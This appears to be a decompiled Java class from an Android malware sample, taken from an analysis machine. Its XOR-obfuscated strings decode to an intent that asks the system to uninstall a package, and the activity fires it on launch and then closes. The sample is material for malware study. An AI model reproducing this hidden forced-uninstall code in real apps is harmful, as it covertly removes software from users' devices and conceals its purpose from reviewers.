package com.zjxyxnvvp.nxvxchltf;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import com.zjxyxnvvp.nxvxchltf.util.c;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class ioNWOADnaoidWNaod extends Activity {
    private static short[] $ = {32229, 32234, 32224, 32246, 32235, 32237, 32224, 32170, 32237, 32234, 32240, 32225, 32234, 32240, 32170, 32229, 32231, 32240, 32237, 32235, 32234, 32170, 32209, 32202, 32205, 32202, 32215, 32208, 32197, 32200, 32200, 32219, 32212, 32197, 32199, 32207, 32197, 32195, 32193, 26613, 26596, 26598, 26606, 26596, 26594, 26592, 26559, 25271, 25272, 25266, 25252, 25273, 25279, 25266, 25336, 25279, 25272, 25250, 25267, 25272, 25250, 25336, 25267, 25262, 25250, 25252, 25271, 25336, 25220, 25235, 25218, 25219, 25220, 25240, 25225, 25220, 25235, 25221, 25219, 25242, 25218};

    /* renamed from: a */
    public static String f341a = "";

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Intent intent = new Intent($(0, 39, 32132));
        intent.setData(Uri.parse($(39, 47, 26501) + f341a));
        f341a = "";
        intent.putExtra($(47, 81, 25302), true);
        c.b();
        startActivityForResult(intent, 0);
        finish();
    }
}
